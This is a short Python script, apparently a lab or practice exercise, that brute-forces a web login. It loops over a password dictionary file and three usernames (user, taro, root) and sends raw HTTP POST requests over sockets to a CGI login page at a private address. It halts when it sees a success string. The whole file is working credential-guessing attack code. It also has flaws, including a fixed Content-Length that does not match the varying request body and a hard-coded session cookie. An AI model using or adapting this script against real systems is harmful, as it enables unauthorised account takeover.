import socket
import sys
fname = './dictpasswd.txt'
target = '<p>login success</p>'
usernames = {'user':'', 'taro':'', 'root':''}
f = open(fname, 'r')
dictpasswds = f.readlines()
f.close()
for dictpasswd in dictpasswds:
    passwd = dictpasswd.rstrip('\n')
    for username in usernames.keys():
        usernames[username] = passwd
        print(username, usernames[username])

        mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysock.connect(('192.168.65.3', 80))
        fname = './dictpasswd.txt'
        msg = 'POST /test/bbslogin.cgi HTTP/1.1\r\n'
        msg = msg + 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
        msg = msg + 'Accept-Encoding: deflate\r\n'
        msg = msg + 'Accept-Language: ja,en-US;q=0.9,en;q=0.8\r\n'
        msg = msg + 'Cache-Control: max-age=0\r\n'
        msg = msg + 'Connection: keep-alive\r\n'
        #msg = msg + 'Conenction: close'
        msg = msg + 'Content-Length: 36\r\n'
        msg = msg + 'Content-Type: application/x-www-form-urlencoded\r\n'
        msg = msg + 'Cookie: PHPSESSID=d3d0gidb8m7np53bnarfvb13v6\r\n'
        msg = msg + 'Host: 192.168.65.3\r\n'
        msg = msg + 'Origin: http://192.168.65.3\r\n'
        msg = msg + 'Referer: http://192.168.65.3/test/bbslogin.cgi\r\n'
        msg = msg + 'Upgrade-Insecure-Requests: 1\r\n'
        msg = msg + 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\r\n'
        msg = msg + '\r\n'
        msg = msg + f'title={usernames[username]}&author={username}&text=dddd\r\n'
        cmd = msg.encode()
        mysock.send(cmd)

        while True:
            data = mysock.recv(4096)
            if (len(data) < 1):
                break
            content = data.decode()
            if target in content:
                print("yes", username, usernames[username])
                sys.exit(0)
        mysock.close()